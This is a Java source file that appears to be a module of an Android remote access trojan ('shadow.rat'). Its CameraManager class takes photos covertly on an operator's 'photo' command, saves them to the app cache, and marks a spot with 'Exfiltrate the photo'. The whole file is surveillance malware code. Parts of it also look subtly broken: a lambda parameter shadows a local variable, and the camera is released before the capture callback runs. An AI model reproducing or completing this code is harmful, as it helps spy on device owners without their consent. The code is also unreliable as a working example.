package com.shadow.rat.modules;

import android.content.Context;
import android.hardware.Camera;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;

public class CameraManager implements Module {

    private final Context context;

    public CameraManager(Context context) {
        this.context = context;
    }

    @Override
    public String execute(String command) {
        if (command.equalsIgnoreCase("photo")) {
            return takePicture();
        }
        return "Unknown command for CameraManager. Available commands: photo";
    }

    private String takePicture() {
        try {
            Camera camera = Camera.open();
            camera.setPreviewDisplay(new SurfaceView(context).getHolder());
            camera.startPreview();
            camera.takePicture(null, null, (data, camera) -> {
                try {
                    File outputFile = File.createTempFile("photo", ".jpg", context.getCacheDir());
                    FileOutputStream fos = new FileOutputStream(outputFile);
                    fos.write(data);
                    fos.close();
                    // Exfiltrate the photo
                } catch (IOException e) {
                    e.printStackTrace();
                }
            });
            camera.stopPreview();
            camera.release();
            return "Picture taken successfully.";
        } catch (IOException e) {
            e.printStackTrace();
            return "Failed to take picture: " + e.getMessage();
        }
    }
}
